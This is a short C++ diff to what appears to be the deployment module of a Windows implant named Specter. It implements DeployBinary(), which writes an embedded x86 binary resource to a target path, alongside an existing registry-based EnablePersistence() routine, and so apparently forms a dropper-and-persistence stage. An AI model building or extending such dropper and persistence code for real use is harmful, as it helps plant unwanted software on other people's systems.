@@ -1,7 +1,10 @@
 #include "SpecterBasicDeployment.hpp"
 #include "SpecterLib/SyscallException.h"
 #include "SpecterLib/CommonPaths.h"
+#include "SpecterLib/ResourceUtils.h"
+#include "resource.h"
 
+#include <fstream>
 #include <winreg/WinReg.hpp>
 
 SpecterBasicDeployment::SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name):
@@ -57,9 +60,21 @@ bool SpecterBasicDeployment::EnablePersistence()
 	return result.IsOk();
 }
 
-bool SpecterBasicDeployment::DeployBinary()
+bool SpecterBasicDeployment::DeployBinary() const
 {
-	//ResourceUtils::ReadRawResource() TODO WIP Dynamically load our binary here
+	const auto specter_binary_content = ResourceUtils::ReadRawResource(SPECTER_X86_BINARY);
+	if (!specter_binary_content.has_value())
+	{
+		return false;
+	}
+
+	std::ofstream output_stream(m_target_file);
+	if (!output_stream.is_open())
+	{
+		return false;
+	}
+
+	output_stream.write(specter_binary_content->data(), specter_binary_content->size());
 	return true;
 }
 
